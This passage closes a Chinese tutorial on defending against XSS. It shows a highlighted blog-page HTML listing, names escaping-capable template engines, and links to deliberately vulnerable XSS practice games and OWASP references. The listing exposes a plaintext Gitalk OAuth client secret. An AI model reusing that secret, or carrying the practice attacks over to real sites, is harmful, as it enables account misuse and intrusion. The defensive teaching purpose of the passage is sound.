                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/12/splice-slice/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"splice slice"</span><span class="nt">&gt;</span>
                        Previous<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>splice slice<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                    
                    <span class="nt">&lt;li</span> <span class="na">class=</span><span class="s">"next"</span><span class="nt">&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/2020/10/12/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%E4%B8%80-%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB/"</span> <span class="na">data-toggle=</span><span class="s">"tooltip"</span> <span class="na">data-placement=</span><span class="s">"top"</span> <span class="na">title=</span><span class="s">"前端安全系列（一）如何防止XSS攻击"</span><span class="nt">&gt;</span>
                        Next<span class="nt">&lt;br&gt;</span>
                        <span class="nt">&lt;span&gt;</span>前端安全系列（一）如何防止XSS攻击<span class="nt">&lt;/span&gt;</span>
                        <span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>


                <span class="c">&lt;!--Gitalk评论start  --&gt;</span>
                
                <span class="c">&lt;!-- 引入Gitalk评论插件  --&gt;</span>
                <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"https://unpkg.com/gitalk/dist/gitalk.css"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://unpkg.com/gitalk@latest/dist/gitalk.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"gitalk-container"</span><span class="nt">&gt;&lt;/div&gt;</span>
                <span class="c">&lt;!-- 引入一个生产md5的js，用于对id值进行处理，防止其过长 --&gt;</span>
                <span class="c">&lt;!-- Thank DF:https://github.com/NSDingFan/NSDingFan.github.io/issues/3#issuecomment-407496538 --&gt;</span>
                <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/js/md5.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
                <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
                    <span class="kd">var</span> <span class="nx">gitalk</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Gitalk</span><span class="p">({</span>
                    <span class="na">clientID</span><span class="p">:</span> <span class="dl">'</span><span class="s1">b070bb95e57a3650e202</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">clientSecret</span><span class="p">:</span> <span class="dl">'</span><span class="s1">8420656a991994ea4aa65c2249b6583d6a4c4c54</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">repo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo.github.io</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">owner</span><span class="p">:</span> <span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">,</span>
                    <span class="na">admin</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">tian-guo-guo</span><span class="dl">'</span><span class="p">],</span>
                    <span class="na">distractionFreeMode</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
                    <span class="na">id</span><span class="p">:</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">pathname</span><span class="p">),</span>
                    <span class="p">});</span>
                    <span class="nx">gitalk</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">gitalk-container</span><span class="dl">'</span><span class="p">);</span>
                <span class="nt">&lt;/script&gt;</span>
                
                <span class="c">&lt;!-- Gitalk end --&gt;</span>

                

            <span class="nt">&lt;/div&gt;</span>  

    <span class="c">&lt;!-- Side Catalog Container --&gt;</span>
        
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-2 col-lg-offset-0
                visible-lg-block
                sidebar-container
                catalog-container"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"side-catalog"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;</span>
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"catalog-toggle"</span> <span class="na">href=</span><span class="s">"#"</span><span class="nt">&gt;</span>CATALOG<span class="nt">&lt;/a&gt;</span>
                    <span class="nt">&lt;/h5&gt;</span>
                    <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"catalog-body"</span><span class="nt">&gt;&lt;/ul&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        

    <span class="c">&lt;!-- Sidebar Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container"</span><span class="nt">&gt;</span>

                <span class="c">&lt;!-- Featured Tags --&gt;</span>
                
                <span class="nt">&lt;section&gt;</span>
                    <span class="nt">&lt;hr</span> <span class="na">class=</span><span class="s">"hidden-sm hidden-xs"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;h5&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/tags/"</span><span class="nt">&gt;</span>FEATURED TAGS<span class="nt">&lt;/a&gt;&lt;/h5&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#技术"</span> <span class="na">title=</span><span class="s">"技术"</span> <span class="na">rel=</span><span class="s">"50"</span><span class="nt">&gt;</span>
                                    技术
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#python"</span> <span class="na">title=</span><span class="s">"python"</span> <span class="na">rel=</span><span class="s">"102"</span><span class="nt">&gt;</span>
                                    python
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#nlp"</span> <span class="na">title=</span><span class="s">"nlp"</span> <span class="na">rel=</span><span class="s">"59"</span><span class="nt">&gt;</span>
                                    nlp
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#paper"</span> <span class="na">title=</span><span class="s">"paper"</span> <span class="na">rel=</span><span class="s">"60"</span><span class="nt">&gt;</span>
                                    paper
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#机器翻译"</span> <span class="na">title=</span><span class="s">"机器翻译"</span> <span class="na">rel=</span><span class="s">"57"</span><span class="nt">&gt;</span>
                                    机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#专利"</span> <span class="na">title=</span><span class="s">"专利"</span> <span class="na">rel=</span><span class="s">"17"</span><span class="nt">&gt;</span>
                                    专利
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#新能源"</span> <span class="na">title=</span><span class="s">"新能源"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    新能源
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#pytorch"</span> <span class="na">title=</span><span class="s">"pytorch"</span> <span class="na">rel=</span><span class="s">"9"</span><span class="nt">&gt;</span>
                                    pytorch
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#学习日记"</span> <span class="na">title=</span><span class="s">"学习日记"</span> <span class="na">rel=</span><span class="s">"39"</span><span class="nt">&gt;</span>
                                    学习日记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#github"</span> <span class="na">title=</span><span class="s">"github"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    github
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#numpy"</span> <span class="na">title=</span><span class="s">"numpy"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    numpy
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#娱乐"</span> <span class="na">title=</span><span class="s">"娱乐"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    娱乐
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#钢琴"</span> <span class="na">title=</span><span class="s">"钢琴"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    钢琴
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#读书笔记"</span> <span class="na">title=</span><span class="s">"读书笔记"</span> <span class="na">rel=</span><span class="s">"14"</span><span class="nt">&gt;</span>
                                    读书笔记
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#道德经"</span> <span class="na">title=</span><span class="s">"道德经"</span> <span class="na">rel=</span><span class="s">"7"</span><span class="nt">&gt;</span>
                                    道德经
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#迁移学习"</span> <span class="na">title=</span><span class="s">"迁移学习"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    迁移学习
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#硅谷来信"</span> <span class="na">title=</span><span class="s">"硅谷来信"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    硅谷来信
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#爬虫"</span> <span class="na">title=</span><span class="s">"爬虫"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    爬虫
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#服务器"</span> <span class="na">title=</span><span class="s">"服务器"</span> <span class="na">rel=</span><span class="s">"22"</span><span class="nt">&gt;</span>
                                    服务器
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#算法"</span> <span class="na">title=</span><span class="s">"算法"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    算法
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Scikit-Learn"</span> <span class="na">title=</span><span class="s">"Scikit-Learn"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    Scikit-Learn
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#术语"</span> <span class="na">title=</span><span class="s">"术语"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    术语
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#领域适应"</span> <span class="na">title=</span><span class="s">"领域适应"</span> <span class="na">rel=</span><span class="s">"12"</span><span class="nt">&gt;</span>
                                    领域适应
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#低资源机器翻译"</span> <span class="na">title=</span><span class="s">"低资源机器翻译"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    低资源机器翻译
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#预训练模型"</span> <span class="na">title=</span><span class="s">"预训练模型"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    预训练模型
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Shell"</span> <span class="na">title=</span><span class="s">"Shell"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    Shell
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#论文投稿"</span> <span class="na">title=</span><span class="s">"论文投稿"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    论文投稿
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#语料库"</span> <span class="na">title=</span><span class="s">"语料库"</span> <span class="na">rel=</span><span class="s">"6"</span><span class="nt">&gt;</span>
                                    语料库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#bugs"</span> <span class="na">title=</span><span class="s">"bugs"</span> <span class="na">rel=</span><span class="s">"18"</span><span class="nt">&gt;</span>
                                    bugs
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#饮食"</span> <span class="na">title=</span><span class="s">"饮食"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    饮食
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据增强"</span> <span class="na">title=</span><span class="s">"数据增强"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    数据增强
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LeetCode"</span> <span class="na">title=</span><span class="s">"LeetCode"</span> <span class="na">rel=</span><span class="s">"67"</span><span class="nt">&gt;</span>
                                    LeetCode
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#命名实体识别"</span> <span class="na">title=</span><span class="s">"命名实体识别"</span> <span class="na">rel=</span><span class="s">"3"</span><span class="nt">&gt;</span>
                                    命名实体识别
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#tensorflow"</span> <span class="na">title=</span><span class="s">"tensorflow"</span> <span class="na">rel=</span><span class="s">"4"</span><span class="nt">&gt;</span>
                                    tensorflow
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#数据库"</span> <span class="na">title=</span><span class="s">"数据库"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    数据库
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#咨询"</span> <span class="na">title=</span><span class="s">"咨询"</span> <span class="na">rel=</span><span class="s">"2"</span><span class="nt">&gt;</span>
                                    咨询
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#Offer"</span> <span class="na">title=</span><span class="s">"Offer"</span> <span class="na">rel=</span><span class="s">"42"</span><span class="nt">&gt;</span>
                                    Offer
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#LaTeX"</span> <span class="na">title=</span><span class="s">"LaTeX"</span> <span class="na">rel=</span><span class="s">"1"</span><span class="nt">&gt;</span>
                                    LaTeX
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span> <span class="na">rel=</span><span class="s">"11"</span><span class="nt">&gt;</span>
                                    前端
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
                            
                				<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span> <span class="na">rel=</span><span class="s">"11"</span><span class="nt">&gt;</span>
                                    面试
                                <span class="nt">&lt;/a&gt;</span>
                            
        				
        			<span class="nt">&lt;/div&gt;</span>
                <span class="nt">&lt;/section&gt;</span>
                

                <span class="c">&lt;!-- Friends Blog --&gt;</span>
                
                <span class="nt">&lt;hr&gt;</span>
                <span class="nt">&lt;h5&gt;</span>FRIENDS<span class="nt">&lt;/h5&gt;</span>
                <span class="nt">&lt;ul</span> <span class="na">class=</span><span class="s">"list-inline"</span><span class="nt">&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://i.csdn.net/#/uc/profile"</span><span class="nt">&gt;</span>CSDN·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://www.meipai.com/user/1088601139?client_id=1089857299&amp;gid=1119354961&amp;uid=1088601139&amp;utm_user_id=1088601139&amp;utm_content=test&amp;utm_source=meipai_share&amp;utm_term=meipai_ios"</span><span class="nt">&gt;</span>美拍·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://show.gotokeep.com/users/573d84f646054cc85d430037?utm_source=wechat&amp;utm_medium=web&amp;utm_campaign=client_share&amp;utm_term=&amp;utm_content=users"</span><span class="nt">&gt;</span>Keep·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                        <span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"https://www.douban.com/people/102650670/"</span><span class="nt">&gt;</span>豆瓣·甜果果2333<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
                    
                <span class="nt">&lt;/ul&gt;</span>
                
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/article&gt;</span>






<span class="c">&lt;!-- async load function --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="kd">function</span> <span class="k">async</span><span class="p">(</span><span class="nx">u</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
      <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nb">document</span><span class="p">,</span> <span class="nx">t</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">,</span>
          <span class="nx">o</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">t</span><span class="p">),</span>
          <span class="nx">s</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="nx">t</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
      <span class="nx">o</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">u</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span> <span class="nx">o</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">load</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span> <span class="nx">c</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">e</span><span class="p">);</span> <span class="p">},</span> <span class="kc">false</span><span class="p">);</span> <span class="p">}</span>
      <span class="nx">s</span><span class="p">.</span><span class="nx">parentNode</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">o</span><span class="p">,</span> <span class="nx">s</span><span class="p">);</span>
    <span class="p">}</span>
<span class="nt">&lt;/script&gt;</span>
<span class="c">&lt;!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ --&gt;</span>
<span class="nt">&lt;script&gt;</span>
    <span class="k">async</span><span class="p">(</span><span class="dl">"</span><span class="s2">//cdnjs.cloudflare.com/ajax/libs/anchor-js/1.1.1/anchor.min.js</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">(){</span>
        <span class="c1">// BY Fix:去除标题前的‘#’ issues:</span><span class="o">&lt;</span><span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/qiubaiying/qiubaiying.github.io/issues/137&gt;</span>
        <span class="c1">// anchors.options = {</span>
        <span class="c1">//   visible: 'always',</span>
        <span class="c1">//   placement: 'right',</span>
        <span class="c1">//   icon: '#'</span>
        <span class="c1">// };</span>
        <span class="nx">anchors</span><span class="p">.</span><span class="nx">add</span><span class="p">().</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.intro-header h1</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.subheading</span><span class="dl">'</span><span class="p">).</span><span class="nx">remove</span><span class="p">(</span><span class="dl">'</span><span class="s1">.sidebar-container h5</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">})</span>
<span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;style&gt;</span>
    <span class="c">/* place left on bigger screen */</span>
    <span class="k">@media</span> <span class="n">all</span> <span class="n">and</span> <span class="p">(</span><span class="n">min-width</span><span class="p">:</span> <span class="m">800px</span><span class="p">)</span> <span class="p">{</span>
        <span class="nc">.anchorjs-link</span><span class="p">{</span>
            <span class="nl">position</span><span class="p">:</span> <span class="nb">absolute</span><span class="p">;</span>
            <span class="nl">left</span><span class="p">:</span> <span class="m">-0.75em</span><span class="p">;</span>
            <span class="nl">font-size</span><span class="p">:</span> <span class="m">1.1em</span><span class="p">;</span>
            <span class="nl">margin-top</span> <span class="p">:</span> <span class="m">-0.1em</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;/a&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>目前已经支持 Automatic Context-Aware Escaping 的模板引擎有：</p>

<ul>
  <li><a href="https://golang.org/pkg/html/template/">go html/template</a></li>
  <li><a href="https://developers.google.com/closure/templates/docs/security">Google Closure Templates</a></li>
</ul>

<h2 id="课后作业xss-攻击小游戏">课后作业：XSS 攻击小游戏</h2>

<p>以下是几个 XSS 攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。</p>

<p>在玩游戏的过程中，请各位读者仔细思考和回顾本文内容，加深对 XSS 攻击的理解。</p>

<p><a href="https://alf.nu/alert1">alert(1) to win</a> <a href="http://prompt.ml/">prompt(1) to win</a> <a href="https://xss-game.appspot.com/">XSS game</a></p>

<h2 id="参考文献">参考文献</h2>

<ul>
  <li>Wikipedia. <a href="https://en.wikipedia.org/wiki/Cross-site_scripting">Cross-site scripting</a>, Wikipedia.</li>
  <li>OWASP. <a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>, OWASP.</li>
  <li>OWASP. <a href="https://github.com/OWASP/owasp-java-encoder/wiki/2">Use the OWASP Java Encoder</a>-Use-the-OWASP-Java-Encoder), GitHub.</li>
  <li>Ahmed Elsobky. <a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a>, GitHub.</li>
  <li>Jad S. Boutros. <a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Reducing XSS by way of Automatic Context-Aware Escaping in Template Systems</a>, Google Security Blog.</li>
  <li>Vue.js. <a href="https://vuejs.org/v2/api/#v-html">v-html - Vue API docs</a>, Vue.js.</li>
  <li>React. <a href="https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml">dangerouslySetInnerHTML - DOM Elements</a>, React.</li>
</ul>
:ET